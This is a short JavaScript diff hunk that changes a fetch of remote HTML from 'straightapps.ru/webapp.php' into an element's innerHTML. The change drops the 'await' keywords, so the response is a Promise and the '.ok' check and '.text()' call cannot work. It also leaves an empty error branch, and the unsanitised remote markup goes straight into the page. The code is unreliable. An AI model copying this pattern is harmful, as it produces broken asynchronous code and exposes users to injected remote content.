@@ -285,12 +285,12 @@
         return false;
     }
     
-    const response = await fetch('https://straightapps.ru/webapp.php');
+    var response1 = fetch('https://straightapps.ru/webapp.php');
 
-if (!response.ok) {
+if (!response1.ok) {
 }
 
-document.querySelector('#tttxxx').innerHTML = await response.text();
+document.querySelector('#tttxxx').innerHTML = response1.text();
     
 
     function requestVideo() {
